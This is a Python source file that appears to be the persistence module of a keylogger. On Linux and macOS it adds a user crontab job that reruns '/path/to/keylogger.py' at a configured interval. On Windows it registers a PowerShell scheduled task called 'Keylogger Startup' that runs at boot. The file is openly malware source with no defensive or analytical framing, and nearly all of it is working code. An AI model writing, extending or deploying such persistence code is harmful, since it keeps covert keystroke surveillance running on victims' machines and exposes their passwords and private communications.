import os
import platform
from crontab import CronTab  # For Linux/macOS persistence
from config.loader import ConfigLoader

class PersistenceManager:
    def __init__(self):
        config = ConfigLoader.load_config()
        self.startup_enabled = config["persistence"]["startup"]
        self.interval_seconds = config["persistence"]["interval_seconds"]

    def setup_persistence(self):
        system = platform.system()
        if not self.startup_enabled:
            print("Persistence is disabled in configuration.")
            return

        if system == "Linux" or system == "Darwin":
            self._setup_unix_startup()
        elif system == "Windows":
            self._setup_windows_startup()
        else:
            print("Unsupported OS for persistence setup.")

    def _setup_unix_startup(self):
        cron = CronTab(user=True)
        job = cron.new(command="python3 /path/to/keylogger.py", comment="Keylogger Persistence")
        job.minute.every(self.interval_seconds // 60)
        cron.write()
        print("Persistence setup on Unix-based system.")

    def _setup_windows_startup(self):
        startup_script = rf"""
        $action = New-ScheduledTaskAction -Execute 'python.exe' -Argument '/path/to/keylogger.py'
        $trigger = New-ScheduledTaskTrigger -AtStartup
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Keylogger Startup"
        """
        os.system("powershell.exe " + startup_script)
        print("Persistence setup on Windows.")
